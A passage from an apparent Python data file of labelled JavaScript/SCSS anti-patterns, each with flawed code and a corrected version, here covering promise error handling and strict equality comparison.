    background-color: lightblue;
    color: white;
}

#footer {
    @extend .section-style;
    background-color: lightgreen;
    color: black;
}"""
    },
    {
        "id": 207,
        "name": "Misusing Promises",
        "correct": False,
        "issues": [],
        "link": "",
        "code": """function multiplyAsync(a, b) {
    return Promise.resolve(a * b);
}

multiplyAsync(5, 10).then((result) => {
    console.log(result);
}, (error) => {
    console.error(error);
});

multiplyAsync(5, 'foo').then((result) => {
    console.log(result);
}, (error) => {
    console.error(error);
});""",
        "fix": """function multiplyAsync(a, b) {
    return new Promise((resolve, reject) => {
        if (typeof a === 'number' && typeof b === 'number') {
            resolve(a * b);
        } else {
            reject(new Error('Both operands must be numbers.'));
        }
    });
}

multiplyAsync(5, 10)
    .then((result) => {
        console.log(result);
    })
    .catch((error) => {
        console.error(error);
    });

multiplyAsync(5, 'foo')
    .then((result) => {
        console.log(result);
    })
    .catch((error) => {
        console.error(error); // Properly handles errors thrown by synchronous execution
    });"""
    },
    {
        "id": 208,
        "name": "Using Equality Operators Instead Of Strict Comparison",
        "correct": False,
        "issues": [],
        "link": "",
        "code": """if ('hello' == 'world') {
    console.log('Equal');
} else {
    console.log('Not equal');
}""",
        "fix": """if ('hello' === 'world') {
    console.log('Equal');
} else {
    console.log('Not equal');
}"""
    },
]
